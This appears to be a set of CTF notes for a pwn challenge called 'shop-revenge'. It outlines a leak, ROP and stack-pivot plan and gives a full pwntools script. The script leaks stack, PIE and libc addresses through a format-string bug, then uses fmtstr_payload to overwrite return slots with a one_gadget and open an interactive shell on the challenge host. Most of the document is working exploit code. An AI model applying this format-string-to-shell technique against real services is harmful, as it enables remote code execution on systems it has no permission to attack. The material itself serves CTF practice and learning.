### Notes

---

If protections are enabled :

So the plan is this:

1. leak all the relevent informations we need (libc address, PIE base address, stack address)
2. write a ROP chain somewhere in the memory that’s writable
3. redirect the execution there with a stack pivot.

Once we have all the leaked addr, we’ll have to build a ROP chain to run system(“/bin/sh”).

1. find a one gadget

Normally here is what the rop chain should look like:

```py
pop rdi; ret;
“/bin/sh”
ret;
system
```

```py
#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./shop-revenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

#io = gdb.debug(exe.path, '')
# io = remote('127.0.0.1', 1337)
io = process('nc the-ingredient-shop-s-revenge.challs.brunnerne.xyz 32000'.split())
io.sendlineafter(b'exit\n', b'%42$p-%43$p-%45$p')
io.recvuntil(b'here is your choice\n')
stack_leak, exe_leak, libc_leak = map(lambda n : int(n, 16), io.recvline().strip().split(b'-'))
exe.address = exe_leak-0x1423
libc.address = libc_leak-0x2a1ca
payload = fmtstr_payload(8, writes={
    (stack_leak-8) : p64(libc.address+0xef52b),
    (stack_leak-16) : p64(exe.address+0x4578)
})
io.sendlineafter(b'exit\n', payload)
io.interactive()
```
